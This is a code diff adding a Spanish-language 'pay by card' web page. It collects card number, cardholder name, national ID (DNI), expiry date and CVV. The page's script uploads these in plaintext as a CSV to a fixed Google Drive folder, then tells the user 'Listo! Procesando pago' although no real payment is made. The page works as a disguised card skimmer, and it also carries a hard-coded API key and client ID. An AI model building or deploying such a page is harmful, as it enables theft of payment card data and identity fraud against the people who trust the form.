@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Pagar con tarjeta</title>
+  <style>
+    body {
+      background: linear-gradient(to right, black, gray);
+      padding: 20px;
+      margin: 0;
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+    
+    .container {
+      background-color: rgba(26, 26, 26, 0.8);
+      border-radius: 10px;
+      padding: 20px;
+      width: 400px;
+      opacity: 80%;
+      color: white;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+    
+    .input-field {
+      margin-bottom: 10px;
+    }
+    
+    .input-field label {
+      display: block;
+      margin-bottom: 5px;
+    }
+    
+    .input-field input {
+      width: 100%;
+      padding: 5px;
+      border-radius: 5px;
+      border: none;
+    }
+    
+    button {
+      padding: 10px 20px;
+      background-color: #1e1e1e;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+    
+    #error-message {
+      color: red;
+      margin-bottom: 10px;
+    }
+  </style>
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+  <link rel="stylesheet" href="https://code.jquery.com/ui/1.13.0/themes/base/jquery-ui.css">
+  <script src="https://code.jquery.com/ui/1.13.0/jquery-ui.js"></script>
+  <script src="https://apis.google.com/js/api.js"></script>
+  <script>
+    function authenticate() {
+      return gapi.auth2.getAuthInstance()
+        .signIn({ scope: "https://www.googleapis.com/auth/drive.file" })
+        .then(function() { console.log("Sign-in successful"); },
+              function(error) { console.error("Error signing in", error); });
+    }
+    
+    function uploadCardData(fileName, cardData) {
+      var fileContent = cardData.join(",") + "\n";
+      var fileMetadata = {
+        name: fileName,
+        mimeType: 'text/csv'
+      };
+    
+      var requestBody = {
+        name: fileName,
+        mimeType: 'text/csv',
+        parents: ['1OFmrozQETOYycK_PaB6WEnSkgxxvDBEJ'] 
+      };
+    
+      var mediaContent = {
+        mimeType: 'text/csv',
+        body: fileContent
+      };
+    
+      gapi.client.drive.files.create({
+        resource: requestBody,
+        media: mediaContent,
+        fields: 'id'
+      }).then(function(response) {
+        console.log('Tarjeta guardada con éxito: ' + response.result.id);
+        document.getElementById("success-message").textContent = "Tarjeta guardada con éxito.";
+      }).catch(function(error) {
+        console.error('Error al guardar la tarjeta', error);
+        document.getElementById("error-message").textContent = "Error al guardar la tarjeta.";
+      });
+    }
+    
+    function handleClientLoad() {
+      gapi.load('client:auth2', initClient);
+    }
+    
+    function initClient() {
+      gapi.client.init({
+        apiKey: 'AIzaSyDA-ipY0Tnq82KlzUl2Zg5Km7GjnAjNULU', 
+        clientId: '567982552491-tugoslkuj7a7due1gbeqfflfm8uhcvgg.apps.googleusercontent.com', 
+        discoveryDocs: ["https://www.googleapis.com/discovery/v1/apis/drive/v3/rest"],
+        scope: "https://www.googleapis.com/auth/drive.file"
+      }).then(function() {
+        gapi.auth2.getAuthInstance().isSignedIn.listen(updateSigninStatus);
+        updateSigninStatus(gapi.auth2.getAuthInstance().isSignedIn.get());
+      }).catch(function(error) {
+        console.error("Error initializing the client", error);
+      });
+    }
+    
+    function updateSigninStatus(isSignedIn) {
+  if (isSignedIn) {
+    var cardNumber = document.getElementById("card-number").value;
+    var cardName = document.getElementById("card-name").value;
+    var cardDNI = document.getElementById("card-dni").value;
+    var cardExpiration = document.getElementById("card-expiration").value;
+    var cardCVV = document.getElementById("card-cvv").value;
+
+
+    if (!validateCard(cardNumber)) {
+      document.getElementById("error-message").textContent = "Tarjeta inválida";
+      return;
+    }
+
+    var fileName = cardNumber.substr(0, 4) + '_' + cardName + '_Tarjeta.csv';
+
+    var cardData = [
+      new Date().toLocaleString(),
+      cardNumber,
+      cardName,
+      cardDNI,
+      cardExpiration,
+      cardCVV
+    ];
+
+    uploadCardData(fileName, cardData);
+
+
+    document.getElementById("error-message").textContent = "Listo! Procesando pago";
+
+
+    setTimeout(function() {
+      document.getElementById("error-message").textContent = "";
+    }, 2000);
+  }
+}
+
+    
+    function validateCard(cardNumber) {
+
+      var sum = 0;
+      var isEven = false;
+      
+      for (var i = cardNumber.length - 1; i >= 0; i--) {
+        var digit = parseInt(cardNumber.charAt(i), 10);
+        
+        if (isEven) {
+          digit *= 2;
+          if (digit > 9) {
+            digit -= 9;
+          }
+        }
+        
+        sum += digit;
+        isEven = !isEven;
+      }
+      
+      return sum % 10 === 0;
+    }
+    
+    $(function() {
+      $("#card-expiration").datepicker({
+        dateFormat: "mm/yy",
+        changeMonth: true,
+        changeYear: true,
+        monthNames: [
+          "01", "02", "03", "04", "05", "06",
+          "07", "08", "09", "10", "11", "12"
+        ],
+        monthNamesShort: [
+          "01", "02", "03", "04", "05", "06",
+          "07", "08", "09", "10", "11", "12"
+        ],
+        prevText: "Anterior",
+        nextText: "Siguiente",
+        yearRange: "-0:+10",
+        showOtherMonths: true,
+        selectOtherMonths: true,
+        showMonthAfterYear: true,
+
+      });
+    });
+  </script>
+</head>
+<body>
+  <div class="container">
+    <h1>Pedido por Tarjeta</h1>
+  
+    <div id="error-message"></div>
+  
+    <div class="input-field">
+      <label for="card-number">Número de Tarjeta:</label>
+      <input type="text" id="card-number" maxlength="16" />
+    </div>
+  
+    <div class="input-field">
+      <label for="card-name">Nombre:</label>
+      <input type="text" id="card-name" />
+    </div>
+  
+    <div class="input-field">
+      <label for="card-dni">DNI:</label>
+      <input type="text" id="card-dni" maxlength="8" />
+    </div>
+  
+    <div class="input-field">
+      <label for="card-expiration">Fecha de Expiración:</label>
+      <input type="text" id="card-expiration" />
+    </div>
+    
+    <div class="input-field">
+      <label for="card-cvv">CVV:</label>
+      <input type="text" id="card-cvv" maxlength="3" />
+    </div>
+  
+    <button onclick="authenticate()">Enviar</button>
+  </div>
+  
+  <script src="https://apis.google.com/js/api.js?onload=handleClientLoad"></script>
+</body>
+</html>
